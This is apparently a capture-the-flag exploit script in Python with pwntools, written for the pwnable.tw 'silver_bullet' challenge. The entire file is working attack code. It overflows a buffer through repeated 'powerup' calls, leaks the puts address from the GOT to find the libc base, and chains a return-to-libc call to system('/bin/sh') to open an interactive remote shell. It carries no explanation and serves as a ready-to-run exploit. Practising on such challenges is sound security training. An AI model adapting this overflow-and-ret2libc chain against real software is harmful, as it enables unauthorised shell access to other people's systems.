#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'silver_bullet'
    interruptPoint=[0x9d4]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[-1])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0
if local:
    io = process('./silver_bullet')
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')

else:
    io = remote('chall.pwnable.tw', 10103)
    libc = ELF('./libc_32.so.6')
start = 0x80484f0
elf = ELF('./silver_bullet')

def add(dis):
    io.sendlineafter('choice :', '1')
    io.sendafter('bullet :', dis)

def powerup(dis):
    io.sendlineafter('choice :', '2')
    io.sendafter('bullet :', dis)

def beat():
    io.sendlineafter('choice :', '3')


if __name__ == '__main__':
    add('a' * 40)
    powerup('b' * 8)
    powerup('\xff\xff\xff' + 'c' * 4 + p32(elf.plt['puts']) + p32(start) + p32(elf.got['puts']))
    debug()
    beat()
    io.recvuntil('win !!\n')
    addr = io.recv(4)
    print addr
    libcbase = u32(addr) - libc.sym['puts']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    add('a' * 40)
    powerup('b' * 8)
    powerup('\xff\xff\xff' + 'c' * 4 + p32(sys) + p32(start) + p32(binsh))
    beat()

    io.interactive()
    io.close()




